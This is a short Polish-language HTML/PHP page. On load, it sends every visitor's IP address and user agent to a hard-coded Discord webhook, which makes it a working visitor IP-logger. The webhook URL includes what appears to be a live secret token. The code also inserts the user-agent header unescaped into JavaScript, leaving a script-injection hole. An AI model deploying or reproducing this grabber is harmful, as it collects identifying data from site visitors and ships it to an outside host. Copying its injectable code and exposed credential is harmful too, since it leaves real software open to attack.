<!DOCTYPE html>
<html>
<head>
    <title>Strona z wysyłaniem danych na Discord</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            var ip = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
            var userAgent = '<?php echo $_SERVER['HTTP_USER_AGENT']; ?>';
            var webhookUrl = 'https://discord.com/api/webhooks/1125045960150622268/jatYAwyzE5IIyrBgTanmaMftmZhiqeo26h9rb6Yg3H9zA_tolem5gmXYSKw2JF2o3V41';

            var data = {
                content: 'Adres IP: ' + ip + '\nUser Agent: ' + userAgent
            };

            $.ajax({
                type: "POST",
                url: webhookUrl,
                data: JSON.stringify(data),
                success: function(response) {
                    console.log("Dane zostały wysłane na Discord.");
                },
                error: function(xhr, status, error) {
                    console.log("Wystąpił błąd podczas wysyłania danych.");
                }
            });
        });
    </script>
</head>
<body>
    <h1>Witaj na stronie</h1>
    <p>Twoje informacje zostaną wysłane na Discord.</p>
</body>
</html>
